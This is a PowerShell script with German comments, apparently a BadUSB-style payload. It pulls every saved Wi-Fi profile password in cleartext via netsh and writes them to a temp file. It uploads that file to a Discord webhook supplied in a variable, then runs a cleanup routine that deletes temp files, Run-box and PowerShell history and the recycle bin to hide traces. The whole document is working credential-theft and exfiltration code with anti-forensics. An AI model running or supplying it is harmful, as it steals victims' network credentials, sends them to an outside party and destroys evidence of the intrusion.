# Skript zum Abrufen der WLAN-Profile und deren Passwörter (sofern vorhanden)

# Definiere die Pfad zur temporären Datei, in der die Passwörter gespeichert werden
$filePath = "$env:TEMP\--wifi-pass.txt"
$wifiProfiles = @()

# Alle WLAN-Profile extrahieren
$profileNames = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Trim() -replace "All User Profile\s*:\s*", ""
}

# Überprüfen, ob WLAN-Profile gefunden wurden
if ($profileNames.Count -eq 0) {
    Write-Host "Keine WLAN-Profile gefunden. Stelle sicher, dass du Administratorrechte hast und WLAN-Profile auf deinem PC gespeichert sind."
} else {
    Write-Host "Gefundene WLAN-Profile: $($profileNames.Count)"
}

# Für jedes Profil das Passwort extrahieren
foreach ($name in $profileNames) {
    Write-Host "Verarbeite Profil: $name"
    
    $profileDetails = netsh wlan show profile name="$name" key=clear
    $keyLine = $profileDetails | Select-String "Key Content"

    # Überprüfen, ob ein Passwort gefunden wurde
    if ($keyLine) {
        $password = ($keyLine -split ":", 2)[1].Trim()
        Write-Host "Passwort für $name gefunden: $password"
    } else {
        $password = "<Kein Passwort gefunden>"
        Write-Host "Kein Passwort für $name gefunden."
    }

    # Profilname und Passwort als Objekt speichern
    $wifiProfiles += [PSCustomObject]@{
        PROFILE_NAME = $name
        PASSWORD     = $password
    }
}

# Ausgabe der gefundenen WLAN-Profile und Passwörter als Tabelle
if ($wifiProfiles.Count -gt 0) {
    Write-Host "WLAN-Profile mit Passwörtern:"
    $wifiProfiles | Format-Table -AutoSize

    # Speichern der Daten in einer Datei
    $wifiProfiles | Format-Table -AutoSize | Out-File $filePath
    Write-Host "WLAN-Profile und Passwörter wurden in der Datei gespeichert: $filePath"
} else {
    Write-Host "Keine WLAN-Profile mit Passwörtern gefunden."
}

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}

############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}


RI $env:TEMP/--wifi-pass.txt


